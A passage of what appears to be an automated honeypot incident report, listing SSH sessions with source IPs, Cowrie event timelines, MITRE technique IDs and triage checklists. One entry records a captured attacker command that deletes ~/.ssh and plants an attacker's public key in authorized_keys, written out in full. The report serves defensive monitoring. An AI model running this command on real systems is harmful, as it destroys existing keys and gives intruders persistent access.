| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 03:38:39` | `cowrie.session.connect` |
| `2026-09-29 03:38:39` | `cowrie.client.version` |
| `2026-09-29 03:38:39` | `cowrie.client.kex` |
| `2026-09-29 03:38:40` | `cowrie.login.success` |
| `2026-09-29 03:38:42` | `cowrie.session.params` |
| `2026-09-29 03:38:42` | `cowrie.command.input` |
| `2026-09-29 03:38:42` | `cowrie.command.failed` |
| `2026-09-29 03:43:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.196.142[.]135` to AbuseIPDB if not already reported
- [ ] Block `118.196.142[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10617b415cc8

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 03:46 |
| **Last Seen** | 2026-09-29 03:51 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 03:46:25` | `cowrie.session.connect` |
| `2026-09-29 03:46:25` | `cowrie.client.version` |
| `2026-09-29 03:46:26` | `cowrie.client.kex` |
| `2026-09-29 03:46:27` | `cowrie.login.success` |
| `2026-09-29 03:46:28` | `cowrie.session.params` |
| `2026-09-29 03:46:28` | `cowrie.command.input` |
| `2026-09-29 03:51:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5570fa24361

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 03:46 |
| **Last Seen** | 2026-09-29 03:50 |
| **Session Duration** | 257s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 03:46:33` | `cowrie.session.connect` |
| `2026-09-29 03:46:33` | `cowrie.client.version` |
| `2026-09-29 03:46:33` | `cowrie.client.kex` |
| `2026-09-29 03:46:34` | `cowrie.login.success` |
| `2026-09-29 03:46:35` | `cowrie.session.params` |
| `2026-09-29 03:46:35` | `cowrie.command.input` |
| `2026-09-29 03:50:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c37bc9478d99

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 03:50 |
| **Last Seen** | 2026-09-29 03:55 |
| **Session Duration** | 264s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 03:50:52` | `cowrie.session.connect` |
| `2026-09-29 03:50:52` | `cowrie.client.version` |
| `2026-09-29 03:50:52` | `cowrie.client.kex` |
| `2026-09-29 03:50:53` | `cowrie.login.success` |
| `2026-09-29 03:50:54` | `cowrie.session.params` |
| `2026-09-29 03:50:54` | `cowrie.command.input` |
| `2026-09-29 03:55:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-defd4fafaaf1

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 03:55 |
| **Last Seen** | 2026-09-29 04:00 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 03:55:17` | `cowrie.session.connect` |
| `2026-09-29 03:55:17` | `cowrie.client.version` |
| `2026-09-29 03:55:17` | `cowrie.client.kex` |
| `2026-09-29 03:55:18` | `cowrie.login.success` |
| `2026-09-29 03:55:20` | `cowrie.session.params` |
| `2026-09-29 03:55:20` | `cowrie.command.input` |
| `2026-09-29 04:00:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fa2ab39bfc1

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 03:55 |
| **Last Seen** | 2026-09-29 03:59 |
| **Session Duration** | 252s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 03:55:23` | `cowrie.session.connect` |
| `2026-09-29 03:55:23` | `cowrie.client.version` |
| `2026-09-29 03:55:23` | `cowrie.client.kex` |
| `2026-09-29 03:55:24` | `cowrie.login.success` |
| `2026-09-29 03:55:25` | `cowrie.session.params` |
| `2026-09-29 03:55:25` | `cowrie.command.input` |
| `2026-09-29 03:59:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-144d150c1bf7

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 03:59 |
| **Last Seen** | 2026-09-29 04:03 |
| **Session Duration** | 249s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 03:59:35` | `cowrie.session.connect` |
| `2026-09-29 03:59:35` | `cowrie.client.version` |
| `2026-09-29 03:59:36` | `cowrie.client.kex` |
| `2026-09-29 03:59:37` | `cowrie.login.success` |
| `2026-09-29 03:59:37` | `cowrie.session.params` |
| `2026-09-29 03:59:37` | `cowrie.command.input` |
| `2026-09-29 04:03:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab5cb80b65bc

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 04:03 |
| **Last Seen** | 2026-09-29 04:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:03:45` | `cowrie.session.connect` |
| `2026-09-29 04:03:45` | `cowrie.client.version` |
| `2026-09-29 04:03:45` | `cowrie.client.kex` |
| `2026-09-29 04:03:47` | `cowrie.login.success` |
| `2026-09-29 04:03:48` | `cowrie.session.params` |
| `2026-09-29 04:03:48` | `cowrie.command.input` |
| `2026-09-29 04:03:48` | `cowrie.log.closed` |
| `2026-09-29 04:03:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-508ecd0c57bd

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 04:03 |
| **Last Seen** | 2026-09-29 04:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:03:49` | `cowrie.session.connect` |
| `2026-09-29 04:03:49` | `cowrie.client.version` |
| `2026-09-29 04:03:49` | `cowrie.client.kex` |
| `2026-09-29 04:03:50` | `cowrie.login.success` |
| `2026-09-29 04:03:52` | `cowrie.session.params` |
| `2026-09-29 04:03:52` | `cowrie.command.input` |
| `2026-09-29 04:03:53` | `cowrie.log.closed` |
| `2026-09-29 04:03:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e741ba5f2ff3

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 04:03 |
| **Last Seen** | 2026-09-29 04:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:03:53` | `cowrie.session.connect` |
| `2026-09-29 04:03:53` | `cowrie.client.version` |
| `2026-09-29 04:03:53` | `cowrie.client.kex` |
| `2026-09-29 04:03:55` | `cowrie.login.success` |
| `2026-09-29 04:03:56` | `cowrie.session.params` |
| `2026-09-29 04:03:56` | `cowrie.command.input` |
| `2026-09-29 04:03:56` | `cowrie.log.closed` |
| `2026-09-29 04:03:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-605422de236b

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 04:03 |
| **Last Seen** | 2026-09-29 04:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:03:56` | `cowrie.session.connect` |
| `2026-09-29 04:03:57` | `cowrie.client.version` |
| `2026-09-29 04:03:57` | `cowrie.client.kex` |
| `2026-09-29 04:03:58` | `cowrie.login.success` |
| `2026-09-29 04:04:00` | `cowrie.session.params` |
| `2026-09-29 04:04:00` | `cowrie.command.input` |
| `2026-09-29 04:04:00` | `cowrie.log.closed` |
| `2026-09-29 04:04:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca67f7d9d03e

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 04:04 |
| **Last Seen** | 2026-09-29 04:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:04:03` | `cowrie.session.connect` |
| `2026-09-29 04:04:03` | `cowrie.client.version` |
| `2026-09-29 04:04:03` | `cowrie.client.kex` |
| `2026-09-29 04:04:05` | `cowrie.login.success` |
| `2026-09-29 04:04:06` | `cowrie.session.params` |
| `2026-09-29 04:04:06` | `cowrie.command.input` |
| `2026-09-29 04:04:06` | `cowrie.log.closed` |
| `2026-09-29 04:04:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a4260faf57a

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 04:04 |
| **Last Seen** | 2026-09-29 04:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:04:06` | `cowrie.session.connect` |
| `2026-09-29 04:04:06` | `cowrie.client.version` |
| `2026-09-29 04:04:07` | `cowrie.client.kex` |
| `2026-09-29 04:04:09` | `cowrie.login.success` |
| `2026-09-29 04:04:10` | `cowrie.session.params` |
| `2026-09-29 04:04:10` | `cowrie.command.input` |
| `2026-09-29 04:04:11` | `cowrie.log.closed` |
| `2026-09-29 04:04:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2c20552da19

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 04:04 |
| **Last Seen** | 2026-09-29 04:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:04:11` | `cowrie.session.connect` |
| `2026-09-29 04:04:11` | `cowrie.client.version` |
| `2026-09-29 04:04:12` | `cowrie.client.kex` |
| `2026-09-29 04:04:14` | `cowrie.login.success` |
| `2026-09-29 04:04:15` | `cowrie.session.params` |
| `2026-09-29 04:04:15` | `cowrie.command.input` |
| `2026-09-29 04:04:15` | `cowrie.log.closed` |
| `2026-09-29 04:04:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f358a66bc08

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 04:04 |
| **Last Seen** | 2026-09-29 04:04 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:04:16` | `cowrie.session.connect` |
| `2026-09-29 04:04:16` | `cowrie.client.version` |
| `2026-09-29 04:04:16` | `cowrie.client.kex` |
| `2026-09-29 04:04:28` | `cowrie.login.success` |
| `2026-09-29 04:04:29` | `cowrie.session.params` |
| `2026-09-29 04:04:29` | `cowrie.command.input` |
| `2026-09-29 04:04:29` | `cowrie.log.closed` |
| `2026-09-29 04:04:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dd4f0cdba34

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 04:05 |
| **Last Seen** | 2026-09-29 04:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:05:03` | `cowrie.session.connect` |
| `2026-09-29 04:05:03` | `cowrie.client.version` |
| `2026-09-29 04:05:04` | `cowrie.client.kex` |
| `2026-09-29 04:05:05` | `cowrie.login.success` |
| `2026-09-29 04:05:07` | `cowrie.session.params` |
| `2026-09-29 04:05:07` | `cowrie.command.input` |
| `2026-09-29 04:05:07` | `cowrie.log.closed` |
| `2026-09-29 04:05:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c16308461513

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 04:05 |
| **Last Seen** | 2026-09-29 04:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:05:08` | `cowrie.session.connect` |
| `2026-09-29 04:05:08` | `cowrie.client.version` |
| `2026-09-29 04:05:08` | `cowrie.client.kex` |
| `2026-09-29 04:05:09` | `cowrie.login.success` |
| `2026-09-29 04:05:10` | `cowrie.session.params` |
| `2026-09-29 04:05:10` | `cowrie.command.input` |
| `2026-09-29 04:05:11` | `cowrie.log.closed` |
| `2026-09-29 04:05:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fb2a3258ea2

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 04:05 |
| **Last Seen** | 2026-09-29 04:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:05:11` | `cowrie.session.connect` |
| `2026-09-29 04:05:11` | `cowrie.client.version` |
| `2026-09-29 04:05:11` | `cowrie.client.kex` |
| `2026-09-29 04:05:12` | `cowrie.login.success` |
| `2026-09-29 04:05:13` | `cowrie.session.params` |
| `2026-09-29 04:05:13` | `cowrie.command.input` |
| `2026-09-29 04:05:13` | `cowrie.log.closed` |
| `2026-09-29 04:05:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-583c6d7b0fc4

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 04:05 |
| **Last Seen** | 2026-09-29 04:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:05:14` | `cowrie.session.connect` |
| `2026-09-29 04:05:14` | `cowrie.client.version` |
| `2026-09-29 04:05:14` | `cowrie.client.kex` |
| `2026-09-29 04:05:15` | `cowrie.login.success` |
| `2026-09-29 04:05:17` | `cowrie.session.params` |
| `2026-09-29 04:05:17` | `cowrie.command.input` |
| `2026-09-29 04:05:17` | `cowrie.log.closed` |
| `2026-09-29 04:05:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bf910ec589f

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 04:05 |
| **Last Seen** | 2026-09-29 04:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:05:19` | `cowrie.session.connect` |
| `2026-09-29 04:05:19` | `cowrie.client.version` |
| `2026-09-29 04:05:19` | `cowrie.client.kex` |
| `2026-09-29 04:05:20` | `cowrie.login.success` |
| `2026-09-29 04:05:21` | `cowrie.session.params` |
| `2026-09-29 04:05:21` | `cowrie.command.input` |
| `2026-09-29 04:05:21` | `cowrie.log.closed` |
| `2026-09-29 04:05:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-090587e53682

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 04:05 |
| **Last Seen** | 2026-09-29 04:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:05:22` | `cowrie.session.connect` |
| `2026-09-29 04:05:22` | `cowrie.client.version` |
| `2026-09-29 04:05:22` | `cowrie.client.kex` |
| `2026-09-29 04:05:25` | `cowrie.login.success` |
| `2026-09-29 04:05:26` | `cowrie.session.params` |
| `2026-09-29 04:05:26` | `cowrie.command.input` |
| `2026-09-29 04:05:27` | `cowrie.log.closed` |
| `2026-09-29 04:05:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca616ee608f8

| Field | Detail |
|---|---|
| **Source IP** | `45.123.110[.]70` |
| **First Seen** | 2026-09-29 04:13 |
| **Last Seen** | 2026-09-29 04:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:13:00` | `cowrie.session.connect` |
| `2026-09-29 04:13:00` | `cowrie.client.version` |
| `2026-09-29 04:13:00` | `cowrie.client.kex` |
| `2026-09-29 04:13:01` | `cowrie.login.success` |
| `2026-09-29 04:13:02` | `cowrie.session.params` |
| `2026-09-29 04:13:02` | `cowrie.command.input` |
| `2026-09-29 04:13:02` | `cowrie.command.failed` |
| `2026-09-29 04:13:03` | `cowrie.log.closed` |
| `2026-09-29 04:13:03` | `cowrie.session.params` |
| `2026-09-29 04:13:03` | `cowrie.command.input` |
| `2026-09-29 04:13:04` | `cowrie.session.file_download` |
| `2026-09-29 04:13:04` | `cowrie.log.closed` |
| `2026-09-29 04:13:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.110[.]70` to AbuseIPDB if not already reported
- [ ] Block `45.123.110[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47e944c267aa

| Field | Detail |
|---|---|
| **Source IP** | `45.123.110[.]70` |
| **First Seen** | 2026-09-29 04:13 |
| **Last Seen** | 2026-09-29 04:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:13:04` | `cowrie.session.connect` |
| `2026-09-29 04:13:04` | `cowrie.client.version` |
| `2026-09-29 04:13:04` | `cowrie.client.kex` |
| `2026-09-29 04:13:05` | `cowrie.login.success` |
| `2026-09-29 04:13:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.110[.]70` to AbuseIPDB if not already reported
- [ ] Block `45.123.110[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7794e14fbeea

| Field | Detail |
|---|---|
| **Source IP** | `45.123.110[.]70` |
| **First Seen** | 2026-09-29 04:13 |
| **Last Seen** | 2026-09-29 04:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:13:06` | `cowrie.session.connect` |
| `2026-09-29 04:13:06` | `cowrie.client.version` |
| `2026-09-29 04:13:06` | `cowrie.client.kex` |
| `2026-09-29 04:13:07` | `cowrie.login.success` |
| `2026-09-29 04:13:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.110[.]70` to AbuseIPDB if not already reported
- [ ] Block `45.123.110[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ffef97a7816

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-29 04:26 |
| **Last Seen** | 2026-09-29 04:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:26:40` | `cowrie.session.connect` |
| `2026-09-29 04:26:40` | `cowrie.client.version` |
| `2026-09-29 04:26:40` | `cowrie.client.kex` |
| `2026-09-29 04:26:40` | `cowrie.login.success` |
| `2026-09-29 04:26:40` | `cowrie.direct-tcpip.request` |
| `2026-09-29 04:26:40` | `cowrie.direct-tcpip.data` |
| `2026-09-29 04:26:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfdd2345a559

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-09-29 04:34 |
| **Last Seen** | 2026-09-29 04:34 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:34:06` | `cowrie.session.connect` |
| `2026-09-29 04:34:07` | `cowrie.login.success` |
| `2026-09-29 04:34:07` | `cowrie.session.params` |
| `2026-09-29 04:34:08` | `cowrie.command.input` |
